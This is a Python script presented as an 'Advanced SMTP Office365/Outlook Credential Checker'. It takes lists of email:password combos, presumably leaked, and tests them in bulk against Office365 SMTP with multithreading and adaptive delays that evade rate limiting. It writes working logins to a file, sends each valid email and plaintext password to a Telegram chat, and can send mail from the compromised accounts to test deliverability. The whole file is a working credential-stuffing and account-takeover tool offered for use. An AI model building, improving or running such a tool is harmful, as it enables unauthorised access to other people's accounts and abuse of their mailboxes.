#!/usr/bin/env python3
"""
Advanced SMTP Office365/Outlook Credential Checker
Vérification avancée d'identifiants SMTP Office365/Outlook

Features:
- Multi-threaded SMTP testing
- Email deliverability checking
- Telegram notifications
- Flexible input format support
- Advanced error handling
- Real-time results logging
"""

import smtplib
import ssl
import time
import random
import os
import re
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Dict, List, Tuple, Optional
import requests
import json
from datetime import datetime

# Configuration
CONFIG = {
    'smtp_server': 'smtp.office365.com',
    'smtp_port': 587,
    'smtp_timeout': 5,  # Reduced from 10s for faster error detection
    'max_threads': 20,  # Increased from 8 for better parallelism
    'delay_range': (0.1, 0.3),  # Reduced from (1,5)s for much faster processing
    'max_retries': 3,  # New: retry failed connections
    'retry_delay': 1.0,  # New: delay between retries
    'rate_limit_detection': True,  # New: adaptive delays for rate limiting
    'adaptive_delay_factor': 2.0,  # New: multiplier for adaptive delays
    'test_email_recipient': '',  # Set this to your test email
    'telegram_bot_token': '',  # Set your Telegram bot token
    'telegram_chat_id': '',  # Set your Telegram chat ID
    'input_file': 'combos.txt',
    'valid_file': 'valid.txt',
    'invalid_file': 'invalid.txt',
    'log_file': 'smtp_checker.log'
}

# Color codes for terminal output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Setup logging
def setup_logging():
    """Configure logging for the application"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(CONFIG['log_file']),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

class SMTPChecker:
    def __init__(self):
        self.logger = setup_logging()
        self.results = {
            'valid': [],
            'invalid': [],
            'errors': [],
            'total_tested': 0,
            'start_time': time.time()
        }
        self.rate_limit_detected = False
        self.adaptive_delay_multiplier = 1.0
        
    def parse_combo_line(self, line: str) -> Optional[Tuple[str, str]]:
        """Parse a combo line supporting multiple separators"""
        line = line.strip()
        if not line or line.startswith('#'):
            return None
            
        # Support different separators: : ; |
        for separator in [':', ';', '|']:
            if separator in line:
                parts = line.split(separator, 1)
                if len(parts) == 2:
                    email, password = parts[0].strip(), parts[1].strip()
                    if self.validate_email(email):
                        return email, password
        return None
    
    def validate_email(self, email: str) -> bool:
        """Basic email validation"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    def test_smtp_credentials(self, email: str, password: str, retry_count: int = 0) -> Dict:
        """Test SMTP credentials with retry logic and return detailed results"""
        result = {
            'email': email,
            'password': password,
            'status': 'invalid',
            'error': None,
            'smtp_success': False,
            'test_email_sent': False,
            'deliverability': 'unknown',
            'retry_count': retry_count
        }
        
        try:
            # Create SMTP connection with optimized settings
            with smtplib.SMTP(CONFIG['smtp_server'], CONFIG['smtp_port'], timeout=CONFIG['smtp_timeout']) as server:
                server.starttls(context=ssl.create_default_context())
                server.login(email, password)
                
                result['status'] = 'valid'
                result['smtp_success'] = True
                
                # Send test email if configured
                if CONFIG['test_email_recipient']:
                    test_result = self.send_test_email(server, email, password)
                    result.update(test_result)
                
                self.logger.info(f"{Colors.GREEN}[VALID]{Colors.END} {email}:{password}")
                
        except smtplib.SMTPAuthenticationError as e:
            # Authentication errors are permanent - don't retry
            result['error'] = f'Authentication failed: {str(e)}'
            result['status'] = 'invalid'
            self.logger.info(f"{Colors.RED}[INVALID]{Colors.END} {email} - Auth failed")
            
        except (smtplib.SMTPServerDisconnected, smtplib.SMTPConnectError, OSError, ConnectionError) as e:
            # Connection errors may be transient - retry if attempts remain
            error_str = str(e).lower()
            
            # Detect potential rate limiting
            if CONFIG['rate_limit_detection'] and ('rate' in error_str or 'limit' in error_str or 'too many' in error_str):
                self.rate_limit_detected = True
                self.adaptive_delay_multiplier *= CONFIG['adaptive_delay_factor']
                self.logger.warning(f"{Colors.MAGENTA}[RATE_LIMIT_DETECTED]{Colors.END} {email} - Adapting delays (x{self.adaptive_delay_multiplier:.1f})")
            
            if retry_count < CONFIG['max_retries']:
                retry_delay = CONFIG['retry_delay'] * (2 ** retry_count) * self.adaptive_delay_multiplier
                self.logger.warning(f"{Colors.YELLOW}[RETRY]{Colors.END} {email} - Connection error, retrying in {retry_delay:.1f}s... ({retry_count + 1}/{CONFIG['max_retries']})")
                time.sleep(retry_delay)
                return self.test_smtp_credentials(email, password, retry_count + 1)
            else:
                result['error'] = f'Connection failed after {CONFIG["max_retries"]} retries: {str(e)}'
                result['status'] = 'error'
                self.logger.error(f"{Colors.RED}[CONNECTION_FAILED]{Colors.END} {email} - Max retries exceeded")
            
        except smtplib.SMTPException as e:
            # Other SMTP errors may be transient depending on the error
            error_str = str(e).lower()
            if ('timeout' in error_str or 'temporary' in error_str) and retry_count < CONFIG['max_retries']:
                self.logger.warning(f"{Colors.YELLOW}[RETRY]{Colors.END} {email} - SMTP error, retrying... ({retry_count + 1}/{CONFIG['max_retries']})")
                time.sleep(CONFIG['retry_delay'] * (2 ** retry_count))
                return self.test_smtp_credentials(email, password, retry_count + 1)
            else:
                result['error'] = f'SMTP error: {str(e)}'
                result['status'] = 'error'
                self.logger.warning(f"{Colors.YELLOW}[SMTP_ERROR]{Colors.END} {email} - {str(e)}")
            
        except ssl.SSLError as e:
            # SSL errors may be transient - retry once
            if retry_count < min(1, CONFIG['max_retries']):
                self.logger.warning(f"{Colors.YELLOW}[RETRY]{Colors.END} {email} - SSL error, retrying... ({retry_count + 1}/{CONFIG['max_retries']})")
                time.sleep(CONFIG['retry_delay'])
                return self.test_smtp_credentials(email, password, retry_count + 1)
            else:
                result['error'] = f'SSL error: {str(e)}'
                result['status'] = 'error'
                self.logger.warning(f"{Colors.YELLOW}[SSL_ERROR]{Colors.END} {email} - SSL error")
            
        except Exception as e:
            result['error'] = f'Unexpected error: {str(e)}'
            result['status'] = 'error'
            self.logger.error(f"{Colors.RED}[ERROR]{Colors.END} {email} - {str(e)}")
        
        return result
    
    def send_test_email(self, server: smtplib.SMTP, sender_email: str, sender_password: str) -> Dict:
        """Send a test email and check deliverability"""
        test_result = {
            'test_email_sent': False,
            'deliverability': 'unknown'
        }
        
        try:
            # Create test email
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = CONFIG['test_email_recipient']
            msg['Subject'] = f"SMTP Test from {sender_email}"
            
            body = f"""
            This is a test email sent from {sender_email}
            
            Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            Purpose: SMTP credential validation
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            server.send_message(msg)
            test_result['test_email_sent'] = True
            
            # Basic deliverability check (simplified)
            test_result['deliverability'] = 'sent'
            
            self.logger.info(f"{Colors.CYAN}[TEST_EMAIL_SENT]{Colors.END} {sender_email} -> {CONFIG['test_email_recipient']}")
            
        except Exception as e:
            self.logger.warning(f"{Colors.YELLOW}[TEST_EMAIL_FAILED]{Colors.END} {sender_email} - {str(e)}")
        
        return test_result
    
    def send_telegram_notification(self, result: Dict):
        """Send Telegram notification for valid credentials"""
        if not CONFIG['telegram_bot_token'] or not CONFIG['telegram_chat_id']:
            return
        
        try:
            message = f"""
🔑 *Valid SMTP Credentials Found*

📧 Email: `{result['email']}`
🔐 Password: `{result['password']}`
✅ Status: {result['status']}
📨 Test Email: {'Sent' if result['test_email_sent'] else 'Not sent'}
📬 Deliverability: {result['deliverability']}

⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """.strip()
            
            url = f"https://api.telegram.org/bot{CONFIG['telegram_bot_token']}/sendMessage"
            data = {
                'chat_id': CONFIG['telegram_chat_id'],
                'text': message,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, data=data, timeout=10)
            if response.status_code == 200:
                self.logger.info(f"{Colors.BLUE}[TELEGRAM_SENT]{Colors.END} Notification sent for {result['email']}")
            else:
                self.logger.warning(f"{Colors.YELLOW}[TELEGRAM_FAILED]{Colors.END} Failed to send notification")
                
        except Exception as e:
            self.logger.error(f"{Colors.RED}[TELEGRAM_ERROR]{Colors.END} {str(e)}")
    
    def save_result(self, result: Dict):
        """Save result to appropriate file"""
        if result['status'] == 'valid':
            self.results['valid'].append(result)
            with open(CONFIG['valid_file'], 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
            
            # Send Telegram notification for valid credentials
            self.send_telegram_notification(result)
            
        elif result['status'] == 'invalid':
            self.results['invalid'].append(result)
            with open(CONFIG['invalid_file'], 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
                
        else:  # errors
            self.results['errors'].append(result)
            with open('errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']} - {result['error']}\n")
    
    def process_combo(self, combo_data: Tuple[str, str]) -> Dict:
        """Process a single combo with adaptive delay"""
        email, password = combo_data
        
        # Apply adaptive delay if rate limiting detected
        base_delay = random.uniform(*CONFIG['delay_range'])
        adaptive_delay = base_delay * self.adaptive_delay_multiplier
        
        if self.rate_limit_detected and adaptive_delay > base_delay:
            self.logger.debug(f"{Colors.CYAN}[ADAPTIVE_DELAY]{Colors.END} {email} - Using {adaptive_delay:.2f}s delay")
        
        time.sleep(adaptive_delay)
        
        # Test the credentials with retry logic
        result = self.test_smtp_credentials(email, password)
        
        # Save the result
        self.save_result(result)
        
        self.results['total_tested'] += 1
        
        return result
    
    def load_combos(self) -> List[Tuple[str, str]]:
        """Load combos from input file"""
        combos = []
        
        try:
            with open(CONFIG['input_file'], 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    combo = self.parse_combo_line(line)
                    if combo:
                        combos.append(combo)
                    elif line.strip() and not line.strip().startswith('#'):
                        self.logger.warning(f"Invalid combo format at line {line_num}: {line.strip()}")
                        
        except FileNotFoundError:
            self.logger.error(f"{Colors.RED}Input file '{CONFIG['input_file']}' not found{Colors.END}")
            return []
        except Exception as e:
            self.logger.error(f"{Colors.RED}Error reading input file: {str(e)}{Colors.END}")
            return []
        
        self.logger.info(f"{Colors.CYAN}Loaded {len(combos)} combos from {CONFIG['input_file']}{Colors.END}")
        return combos
    
    def run(self):
        """Main execution method with improved progress tracking"""
        self.logger.info(f"{Colors.BOLD}{Colors.CYAN}🚀 Starting Advanced SMTP Checker{Colors.END}")
        
        # Load combos
        combos = self.load_combos()
        if not combos:
            self.logger.error("No valid combos to process")
            return
        
        # Clear previous results files
        for file_path in [CONFIG['valid_file'], CONFIG['invalid_file'], 'errors.txt']:
            if os.path.exists(file_path):
                os.remove(file_path)
        
        # Initialize performance tracking
        self.results['retries'] = 0
        self.results['connection_errors'] = 0
        
        # Process combos with optimized multithreading
        with ThreadPoolExecutor(max_workers=CONFIG['max_threads']) as executor:
            future_to_combo = {executor.submit(self.process_combo, combo): combo for combo in combos}
            
            completed = 0
            last_progress_report = 0
            
            for future in as_completed(future_to_combo):
                completed += 1
                combo = future_to_combo[future]
                
                try:
                    result = future.result()
                    
                    # Track retry statistics
                    if 'retry_count' in result and result['retry_count'] > 0:
                        self.results['retries'] += result['retry_count']
                    if result['status'] == 'error' and 'connection' in result.get('error', '').lower():
                        self.results['connection_errors'] += 1
                    
                    # More frequent progress reporting for better user experience
                    if completed - last_progress_report >= max(1, len(combos) // 100) or completed == len(combos):
                        progress = (completed / len(combos)) * 100
                        valid_count = len(self.results['valid'])
                        invalid_count = len(self.results['invalid'])
                        error_count = len(self.results['errors'])
                        
                        self.logger.info(f"{Colors.BLUE}Progress: {completed}/{len(combos)} ({progress:.1f}%) - "
                                       f"Valid: {valid_count}, Invalid: {invalid_count}, Errors: {error_count}{Colors.END}")
                        last_progress_report = completed
                        
                except Exception as e:
                    self.logger.error(f"{Colors.RED}Error processing {combo[0]}: {str(e)}{Colors.END}")
        
        # Print final summary
        self.print_summary()
    
    def print_summary(self):
        """Print enhanced final summary of results"""
        total_time = time.time() - self.results['start_time']
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}=" * 70)
        print(f"                    📊 FINAL SUMMARY")
        print(f"=" * 70 + Colors.END)
        
        print(f"{Colors.WHITE}📈 Total Combos Tested: {Colors.BOLD}{self.results['total_tested']}{Colors.END}")
        print(f"{Colors.GREEN}✅ Valid Credentials: {Colors.BOLD}{len(self.results['valid'])}{Colors.END}")
        print(f"{Colors.RED}❌ Invalid Credentials: {Colors.BOLD}{len(self.results['invalid'])}{Colors.END}")
        print(f"{Colors.YELLOW}⚠️  Connection Errors: {Colors.BOLD}{len(self.results['errors'])}{Colors.END}")
        
        # Performance metrics
        if self.results['total_tested'] > 0:
            rate = self.results['total_tested'] / total_time if total_time > 0 else 0
            print(f"{Colors.CYAN}⚡ Processing Rate: {Colors.BOLD}{rate:.1f} combos/second{Colors.END}")
        
        print(f"{Colors.BLUE}⏱️  Total Time: {Colors.BOLD}{total_time:.2f} seconds{Colors.END}")
        
        # Retry statistics
        if hasattr(self.results, 'retries') and self.results.get('retries', 0) > 0:
            print(f"{Colors.MAGENTA}🔄 Total Retries: {Colors.BOLD}{self.results.get('retries', 0)}{Colors.END}")
        
        if self.rate_limit_detected:
            print(f"{Colors.MAGENTA}⚠️  Rate Limiting Detected: {Colors.BOLD}Yes (adaptive delays active){Colors.END}")
        
        if hasattr(self.results, 'connection_errors'):
            print(f"{Colors.YELLOW}🔌 Connection Errors: {Colors.BOLD}{self.results.get('connection_errors', 0)}{Colors.END}")
        
        if self.results['valid']:
            print(f"\n{Colors.GREEN}{Colors.BOLD}Valid Credentials:{Colors.END}")
            for result in self.results['valid']:
                test_email_status = "✓" if result['test_email_sent'] else "✗"
                retry_info = f" (retries: {result.get('retry_count', 0)})" if result.get('retry_count', 0) > 0 else ""
                print(f"  📧 {result['email']}:{result['password']} [Test Email: {test_email_status}]{retry_info}")
        
        if len(self.results['valid']) > 0:
            success_rate = (len(self.results['valid']) / self.results['total_tested']) * 100
            print(f"\n{Colors.CYAN}📊 Success Rate: {Colors.BOLD}{success_rate:.2f}%{Colors.END}")
        
        # Error breakdown for better debugging
        if self.results['errors']:
            error_types = {}
            for result in self.results['errors']:
                error = result.get('error', 'Unknown')
                if 'Connection failed' in error:
                    error_types['Connection Issues'] = error_types.get('Connection Issues', 0) + 1
                elif 'SSL error' in error:
                    error_types['SSL Issues'] = error_types.get('SSL Issues', 0) + 1
                elif 'SMTP error' in error:
                    error_types['SMTP Issues'] = error_types.get('SMTP Issues', 0) + 1
                else:
                    error_types['Other'] = error_types.get('Other', 0) + 1
            
            print(f"\n{Colors.YELLOW}{Colors.BOLD}Error Breakdown:{Colors.END}")
            for error_type, count in error_types.items():
                print(f"  ⚠️  {error_type}: {count}")
        
        print(f"\n{Colors.WHITE}📁 Results saved to:")
        print(f"  ✅ Valid: {CONFIG['valid_file']}")
        print(f"  ❌ Invalid: {CONFIG['invalid_file']}")
        print(f"  ⚠️  Errors: errors.txt")
        print(f"  📋 Logs: {CONFIG['log_file']}{Colors.END}")
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}✨ SMTP Checking Complete! ✨{Colors.END}\n")

def load_config_from_file():
    """Load configuration from config file if exists"""
    config_file = 'config.json'
    if os.path.exists(config_file):
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                file_config = json.load(f)
                CONFIG.update(file_config)
                print(f"{Colors.CYAN}Configuration loaded from {config_file}{Colors.END}")
        except Exception as e:
            print(f"{Colors.YELLOW}Warning: Could not load config file: {str(e)}{Colors.END}")

def create_sample_config():
    """Create a sample configuration file"""
    sample_config = {
        "test_email_recipient": "your-test-email@gmail.com",
        "telegram_bot_token": "YOUR_BOT_TOKEN_HERE",
        "telegram_chat_id": "YOUR_CHAT_ID_HERE",
        "max_threads": 20,
        "delay_range": [0.1, 0.3],
        "smtp_timeout": 5,
        "max_retries": 3,
        "retry_delay": 1.0,
        "rate_limit_detection": True,
        "adaptive_delay_factor": 2.0
    }
    
    with open('config.json.example', 'w', encoding='utf-8') as f:
        json.dump(sample_config, f, indent=4)
    
    print(f"{Colors.CYAN}Sample configuration created: config.json.example{Colors.END}")
    print("Copy it to config.json and update with your settings.")

if __name__ == "__main__":
    print(f"{Colors.BOLD}{Colors.CYAN}Advanced SMTP Office365/Outlook Checker{Colors.END}")
    print(f"{Colors.WHITE}Version 1.0 - Multi-threaded with advanced features{Colors.END}\n")
    
    # Load configuration
    load_config_from_file()
    
    # Create sample config if it doesn't exist
    if not os.path.exists('config.json'):
        create_sample_config()
    
    # Check if input file exists
    if not os.path.exists(CONFIG['input_file']):
        print(f"{Colors.RED}Input file '{CONFIG['input_file']}' not found!{Colors.END}")
        print(f"{Colors.WHITE}Create a file with email:password combinations (one per line){Colors.END}")
        exit(1)
    
    # Start the checker
    checker = SMTPChecker()
    try:
        checker.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️  Process interrupted by user{Colors.END}")
        checker.print_summary()
    except Exception as e:
        print(f"\n{Colors.RED}💥 Fatal error: {str(e)}{Colors.END}")
        logging.error(f"Fatal error: {str(e)}")